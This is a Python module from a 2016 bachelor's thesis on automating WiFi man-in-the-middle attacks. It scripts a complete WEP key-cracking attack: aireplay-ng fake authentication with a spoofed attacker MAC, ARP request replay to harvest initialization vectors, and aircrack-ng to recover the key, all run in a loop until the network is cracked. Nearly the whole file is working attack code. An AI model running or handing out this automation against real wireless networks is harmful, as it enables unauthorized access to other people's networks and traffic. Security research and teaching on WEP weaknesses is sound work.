#!/usr/bin/env python3
"""
WEP cracking

Automatization of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016

#Implementation notes
- Airodump-ng writes its Text User Interface to stderr, stdout is empty.
- Aireplay-ng writes to stdout.
- Feedback from running subprocesses is obtained from their stdout and stderr. Method Popen.communicate() is
  unfortunately not suitable. 'Read data from stdout and stderr, until end-of-file is reached. Wait for process
  to terminate.'
  Reading of stdout and stderr is done continuously while the subprocess is running. This is achieved by that
  the subprocess is writing its stdout and stderr to temporary files. These files are then opened again and continuous
  writing and reading is performed. There's only one writer and one reader per file.
- Subprocesses' feedback result is available as an update of process' state, flags and stats. State describes current
  position in a lifecycle of the process. Flags can be set or cleared based on events during life of the process.
  Flags can be later cleared or set by other parts of the script - after the flag was recognised and appropriate
  reaction was performed.

"""
import logging
import os
import re
import subprocess
import tempfile
import time
from enum import Enum, unique

from common import WirelessCapturer

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'


class FakeAuthentication(object):
    """
    The  fake authentication attack allows you to perform the two types of WEP authentication (Open System and
    Shared Key) plus associate with the access point (AP). This is only useful when you need  an associated  MAC
    address in various aireplay-ng attacks and there is currently no associated client.
    It should be noted that the fake authentication attack does NOT generate any ARP packets.
    Fake authentication cannot be used to authenticate/associate with WPA/WPA2 Access Points.

    `fake_authentication[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=fake_authentication>`_
    """

    @unique
    class State(Enum):
        """
        FakeAuthentication process states.
        """
        ok = 0  # Authenticated and associated successfully, sending keep-alive packet.
        new = 1  # just started
        waiting_for_beacon_frame = 2  # 'Waiting for beacon frame'
        terminated = 100

    def __init__(self, tmp_dir, interface, ap, attacker_mac):
        self.tmp_dir = tmp_dir
        self.interface = interface
        self.ap = ap
        self.attacker_mac = attacker_mac

        self.process = None
        self.state = None
        self.flags = {}
        # process' stdout, stderr for its writing
        self.process_stdout_w = None
        self.process_stderr_w = None
        # process' stdout, stderr for reading
        self.process_stdout_r = None
        self.process_stderr_r = None

    def __init_flags(self):
        """
        Init flags describing state of the running process.
        Should be called only during start of the process. Flags are set during update_state().
        """
        self.flags['deauthenticated'] = False
        """Flag 'deauthenticated' is set if at least one deauthentication packet was received."""

    def start(self, reassoc_delay=30, keep_alive_delay=5):
        """
        :param reassoc_delay: reassociation timing in seconds
        :param keep_alive_delay: time between keep-alive packets
        """
        self.state = FakeAuthentication.State.new
        self.__init_flags()

        cmd = ['aireplay-ng',
               '--fakeauth', str(reassoc_delay),
               '-q', str(keep_alive_delay),
               '-a', self.ap.bssid,
               '-h', self.attacker_mac,
               self.interface]
        # temp files (write, read) for stdout and stderr
        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='fakeauth-stdout', dir=self.tmp_dir)
        self.process_stdout_r = open(self.process_stdout_w.name, 'r')

        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='fakeauth-stderr', dir=self.tmp_dir)
        self.process_stderr_r = open(self.process_stderr_w.name, 'r')

        # start process
        self.process = subprocess.Popen(cmd,
                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
                                        universal_newlines=True)
        logging.debug('FakeAuthentication started; ' +
                      'stdout @ ' + self.process_stdout_w.name +
                      ', stderr @ ' + self.process_stderr_w.name)

    def update_state(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive. Set appropriate flags.
        """
        # check every added line in stdout
        for line in self.process_stdout_r:
            if 'Waiting for beacon frame' in line:
                self.state = FakeAuthentication.State.waiting_for_beacon_frame
            elif 'Association successful' in line:
                self.state = FakeAuthentication.State.ok
            elif 'Got a deauthentication packet!' in line:
                # set flag to notify that at least one deauthentication packet was received since last update
                self.flags['deauthenticated'] = True
                logging.debug('FakeAuthentication received a deauthentication packet!')

        # check stderr
        # TODO (xvondr20) Does 'aireplay-ng --fakeauth' ever print anything to stderr?
        assert self.process_stderr_r.read() == ''

        # is process running?
        if self.process.poll() is not None:
            self.state = FakeAuthentication.State.terminated

    def stop(self):
        """
        Stop running process.
        If the process is stopped or already finished, exitcode is returned.
        In the case that there was not any process, nothing happens.
        :return:
        """
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logging.debug('FakeAuthentication killed')

            self.process = None
            return exitcode

    def clean(self):
        """
        Clean after running process.
        Running process is stopped, temp files are closed and deleted,
        :return:
        """
        logging.debug('FakeAuthentication clean')
        # if the process is running, stop it and then clean
        if self.process:
            self.stop()
        # close opened files
        self.process_stdout_r.close()
        self.process_stdout_r = None

        self.process_stdout_w.close()
        self.process_stdout_w = None

        self.process_stderr_r.close()
        self.process_stderr_r = None

        self.process_stderr_w.close()
        self.process_stderr_w = None

        # remove state
        self.state = None
        self.flags.clear()


class ArpReplay(object):
    """
    The classic ARP request replay attack is the most effective way to generate new initialization vectors  (IVs),
    and works very reliably. The program listens for an ARP packet then retransmits it back to the access point.
    This, in turn,  causes  the  access point  to  repeat  the  ARP  packet  with  a new IV. The program retransmits
    the same ARP packet over and over. However, each ARP packet  repeated  by  the  access point has a new IVs.
    It is all these new IVs which allow you to determine the WEP key.

    `arp-request_reinjection[Aircrack-ng]<http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection>`_
    """

    @unique
    class State(Enum):
        """
        ArpReplay process states.
        """
        ok = 0  # got ARP requests, sending packets,
        # Read (\d+) packets (got (\d*[1-9]\d*) ARP requests and (\d*[1-9]\d*) ACKs), sent (\d*[1-9]\d*) packets
        new = 1  # just started
        waiting_for_beacon_frame = 2  # 'Waiting for beacon frame'
        waiting_for_arp_request = 3  # 'Read (\d+) packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)'
        terminated = 100

    def __init__(self, interface, ap):
        self.interface = interface
        self.ap = ap

        self.process = None
        self.state = None
        self.flags = {}
        self.stats = {}
        self.tmp_dir = None

        # process' stdout, stderr for its writing
        self.process_stdout_w = None
        self.process_stderr_w = None
        # process' stdout, stderr for reading
        self.process_stdout_r = None
        self.process_stderr_r = None

        # compiled regular expressions
        self.cre_ok = re.compile(
            r'Read (?P<read>\d+) packets \(got (?P<ARPs>\d*[1-9]\d*) ARP requests and (?P<ACKs>\d*[1-9]\d*) ACKs\),'
            r' sent (?P<sent>\d*[1-9]\d*) packets...\((?P<pps>\d+) pps\)'
        )

    def __init_flags(self):
        """
        Init flags describing state of the running process.
        Should be called only during start of the process. Flags are set during update_state().
        """
        self.flags['deauthenticated'] = False
        """Flag 'deauthenticated' is set if at least one deauthentication packet was received."""

    def __init_stats(self):
        """
        Init stats describing state of the running process.
        Should be called only during start of the process.
        """
        self.stats = {
            'read': 0,
            'ACKs': 0,
            'ARPs': 0,
            'sent': 0,
            'pps': 0
        }

    def start(self, source_mac, input_pcap_path=None):
        """
        Start ARP Replay attack process.
        :param source_mac: Source MAC address for replayed ARP packets
        :param input_pcap_path: Extract ARP packets from this pcap file. If None, packets are captured from interface.
        """
        self.state = ArpReplay.State.new
        self.__init_flags()
        self.__init_stats()
        self.tmp_dir = tempfile.TemporaryDirectory()

        cmd = ['aireplay-ng',
               '--arpreplay',
               '-b', self.ap.bssid,  # MAC address of access point.
               '-h', source_mac]
        # capture or extract packets?
        if input_pcap_path:
            if not os.path.isfile(input_pcap_path):
                raise FileNotFoundError('File does not exist at provided input_pcap_path.')
            cmd.append('-r')
            cmd.append(input_pcap_path)
        cmd.append(self.interface)

        # temp files (write, read) for stdout and stderr
        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='arpreplay-stdout', dir=self.tmp_dir.name)
        self.process_stdout_r = open(self.process_stdout_w.name, 'r')

        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='arpreplay-stderr', dir=self.tmp_dir.name)
        self.process_stderr_r = open(self.process_stderr_w.name, 'r')

        self.process = subprocess.Popen(cmd, cwd=self.tmp_dir.name,
                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
                                        universal_newlines=True)
        logging.debug('ArpReplay started; cwd=' + self.tmp_dir.name + ', ' +
                      'stdout @ ' + self.process_stdout_w.name +
                      ', stderr @ ' + self.process_stderr_w.name)

    def update_state(self):
        """
        Update state of running process from process' feedback.
        Read new output from stdout and stderr, check if process is alive. Set appropriate flags and stats.
        """
        # check every added line in stdout
        for line in self.process_stdout_r:
            if 'Waiting for beacon frame' in line:
                self.state = ArpReplay.State.waiting_for_beacon_frame
            elif 'got 0 ARP requests' in line:
                self.state = ArpReplay.State.waiting_for_arp_request
            elif 'Notice: got a deauth/disassoc packet. Is the source MAC associated ?' in line:
                # set flag to notify that at least one deauthentication packet was received since last update
                self.flags['deauthenticated'] = True
                logging.debug('ArpReplay received a deauthentication packet!')
            else:
                m = self.cre_ok.match(line)
                if m:
                    # correct output line detected
                    self.state = ArpReplay.State.ok
                    # update stats
                    self.stats['read'] = m.group('read')
                    self.stats['ACKs'] = m.group('ACKs')
                    self.stats['ARPs'] = m.group('ARPs')
                    self.stats['sent'] = m.group('sent')
                    self.stats['pps'] = m.group('pps')

        # check stderr
        # TODO (xvondr20) Does 'aireplay-ng --arpreplay' ever print anything to stderr?
        assert self.process_stderr_r.read() == ''

        # is process running?
        if self.process.poll() is not None:
            self.state = ArpReplay.State.terminated

    def stop(self):
        """
        Stop running process.
        If the process is stopped or already finished, exitcode is returned.
        In the case that there was not any process, nothing happens.
        :return:
        """
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logging.debug('ArpReplay killed')

            self.process = None
            return exitcode

    def clean(self):
        """
        Clean after running process.
        Running process is stopped, temp files are closed and deleted,
        :return:
        """
        logging.debug('ArpReplay clean')
        # if the process is running, stop it and then clean
        if self.process:
            self.stop()
        # close opened files
        self.process_stdout_r.close()
        self.process_stdout_r = None

        self.process_stdout_w.close()
        self.process_stdout_w = None

        self.process_stderr_r.close()
        self.process_stderr_r = None

        self.process_stderr_w.close()
        self.process_stderr_w = None

        # remove tmp
        self.tmp_dir.cleanup()
        self.tmp_dir = None

        # remove state
        self.state = None
        self.flags.clear()
        self.stats.clear()


class WepCracker(object):
    """
    Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part
    of the aircrack-ng suite determines the WEP key using two fundamental methods. The first method is via the PTW
    approach (Pyshkin, Tews, Weinmann). The default cracking method is PTW. This is done in two phases. In the first
    phase, aircrack-ng only uses ARP packets. If the key is not found, then it uses all the packets in the capture.
    Please remember that not all packets can be used for the PTW method. This Tutorial: Packets Supported for the PTW
    Attack page provides details. An important limitation is that the PTW attack currently can only crack 40 and 104 bit
    WEP keys. The main advantage of the PTW approach is that very few data packets are required to crack the WEP key.
    The second method is the FMS/KoreK method. The FMS/KoreK method incorporates various statistical attacks
    to discover the WEP key and uses these in combination with brute forcing.

    `aircrack-ng[Aircrack-ng] <http://www.aircrack-ng.org/doku.php?id=aircrack-ng>`_
    """

    def __init__(self, cap_filepath, ap):
        self.cap_filepath = cap_filepath
        self.ap = ap

        self.process = None

    def start(self):
        cmd = ['aircrack-ng',
               '-a', '1',
               '--bssid', self.ap.bssid,
               '-q',  # If set, no status information is displayed.
               '-l', self.ap.cracked_psk_path,  # Write the key into a file.
               self.cap_filepath]
        self.process = subprocess.Popen(cmd)
        logging.debug('WepCracker started')

    def stop(self):
        """
        Stop running process.
        If the process is stopped or already finished, exitcode is returned.
        In the case that there was not any process, nothing happens.
        :return:
        """
        if self.process:
            exitcode = self.process.poll()
            if exitcode is None:
                self.process.terminate()
                time.sleep(1)
                self.process.kill()
                exitcode = self.process.poll()
                logging.debug('WepCracker killed')

            self.process = None
            return exitcode


class WepAttacker(object):
    """
    Main class providing attack on WEP secured network.
    """

    def __init__(self, ap, if_mon):
        self.ap = ap
        self.if_mon = if_mon
        self.if_mon_mac = '00:36:76:54:b2:95'  # TODO (xvondr20) Get real MAC address of if_mon interface.

    def start(self, force=False):
        """
        Start attack on WEP secured network.
        If targeted network have already been cracked and `force` is False, attack is skipped.
        :param force: attack even if network have already been cracked
        """
        if not force and self.ap.is_cracked():
            #  AP already cracked
            logging.info('Known ' + str(self.ap))
            return
        with tempfile.TemporaryDirectory() as tmp_dirname:
            capturer = WirelessCapturer(tmp_dir=tmp_dirname, interface=self.if_mon)
            capturer.start(self.ap)

            fake_authentication = FakeAuthentication(tmp_dir=tmp_dirname, interface=self.if_mon, ap=self.ap,
                                                     attacker_mac=self.if_mon_mac)
            fake_authentication.start()
            time.sleep(1)

            arp_replay = ArpReplay(interface=self.if_mon, ap=self.ap)
            arp_replay.start(source_mac=self.if_mon_mac)

            # some time to create capturecapturer.capturing_cap_path
            time.sleep(6)

            cracker = WepCracker(cap_filepath=capturer.capturing_cap_path, ap=self.ap)
            cracker.start()

            while not self.ap.is_cracked():
                fake_authentication.update_state()
                logging.debug('FakeAuthentication: ' + str(fake_authentication.state) + ', ' +
                              'flags: ' + str(fake_authentication.flags)
                              )

                arp_replay.update_state()
                logging.debug('ArpReplay: ' + str(arp_replay.state) + ', ' +
                              'flags: ' + str(arp_replay.flags) + ', ' +
                              'stats: ' + str(arp_replay.stats)
                              )

                logging.debug('#IV = ' + str(capturer.get_iv_sum()))
                time.sleep(5)
            logging.info('Cracked ' + str(self.ap))

            capturer.stop()
            arp_replay.stop()
            fake_authentication.stop()
            fake_authentication.clean()
